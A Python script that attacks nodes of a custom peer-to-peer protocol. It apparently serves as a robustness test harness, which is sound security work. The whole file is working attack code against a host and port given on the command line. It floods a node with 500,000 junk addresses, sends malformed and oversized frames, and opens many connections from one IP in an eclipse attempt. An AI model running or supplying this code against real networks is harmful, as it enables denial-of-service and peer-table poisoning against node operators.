#!/usr/bin/env python3
import socket, struct, sys, time, os
MAGIC = bytes([0x54,0x53,0x4F,0x53])  # P2P_MAGIC 0x534F5354 little-endian
def frame(cmd, payload=b''):
    assert len(cmd)==4
    return MAGIC + cmd + struct.pack('<I', len(payload)) + payload
def recv_frames(sock, want_cmd=None, timeout=3.0):
    sock.settimeout(timeout); buf=b''; got=[]
    try:
        end=time.time()+timeout
        while time.time()<end:
            try: chunk=sock.recv(65536)
            except socket.timeout: break
            if not chunk: break
            buf+=chunk
            while len(buf)>=12:
                if buf[0:4]!=MAGIC: buf=buf[1:]; continue
                cmd=buf[4:8]; ln=struct.unpack('<I',buf[8:12])[0]
                if ln>4*1024*1024: buf=buf[12:]; continue
                if len(buf)<12+ln: break
                pl=buf[12:12+ln]; buf=buf[12+ln:]; got.append((cmd,pl))
                if want_cmd and cmd==want_cmd: return got
    except Exception: pass
    return got
def handshake(sock):
    # read node's VERS (enc off: plaintext). Extract genesis [8:40].
    fr=recv_frames(sock, b'VERS', 4.0)
    gen=None
    for cmd,pl in fr:
        if cmd==b'VERS' and len(pl)>=40: gen=pl[8:40]
    if gen is None: return False
    # reply VERS: i64 height=0 + 32 genesis + cap byte
    vers=struct.pack('<q',0)+gen+bytes([0x01])
    sock.sendall(frame(b'VERS', vers)); time.sleep(0.2)
    recv_frames(sock, b'VACK', 2.0)
    return True
def addr_payload(addrs):
    out=struct.pack('<I', len(addrs))
    for a in addrs:
        b=a.encode(); out+=struct.pack('<I', len(b))+b
    return out

HOST=sys.argv[1]; PORT=int(sys.argv[2]); MODE=sys.argv[3]
if MODE=='poison':
    s=socket.create_connection((HOST,PORT),timeout=5)
    if not handshake(s): print("HANDSHAKE_FAIL"); sys.exit(2)
    print("HANDSHAKE_OK")
    sent=0
    for r in range(500):
        addrs=[f"{(r*7+i)%254+1}.{(i*3)%254+1}.{(i)%254+1}.{(i*5)%254+1}:19333" for i in range(1000)]
        try: s.sendall(frame(b'ADDR', addr_payload(addrs))); sent+=len(addrs)
        except Exception as e: print("SEND_ERR",e); break
        if r%100==0: time.sleep(0.05)
    print(f"POISON_SENT {sent} junk addrs over 500 ADDR frames")
    time.sleep(1); s.close()
elif MODE=='garbage':
    # A: oversized length header (claim 4GB)
    s=socket.create_connection((HOST,PORT),timeout=5)
    s.sendall(MAGIC+b'XXXX'+struct.pack('<I',0xFFFFFFFF)); time.sleep(0.3); s.close()
    # B: random garbage, bad magic
    s=socket.create_connection((HOST,PORT),timeout=5)
    s.sendall(os.urandom(4096)); time.sleep(0.3); s.close()
    # C: valid magic, unknown cmd flood
    s=socket.create_connection((HOST,PORT),timeout=5)
    for _ in range(200): s.sendall(frame(b'ZZZZ', os.urandom(100)))
    time.sleep(0.3); s.close()
    # D: handshake then malformed ADDR (huge count, truncated)
    s=socket.create_connection((HOST,PORT),timeout=5)
    if handshake(s):
        for _ in range(100):
            s.sendall(frame(b'ADDR', struct.pack('<I', 999)+b'\x40\x00\x00\x00'+b'AB'))  # count=999 but truncated
        time.sleep(0.3)
    s.close()
    print("GARBAGE_DONE")
elif MODE=='eclipse':
    # open N connections from this single source IP; node should cap per-IP
    socks=[]
    for i in range(12):
        try:
            s=socket.create_connection((HOST,PORT),timeout=3); handshake(s); socks.append(s)
        except Exception: pass
    print(f"ECLIPSE opened {len(socks)} sockets from one IP")
    time.sleep(3)
    for s in socks:
        try: s.close()
        except: pass
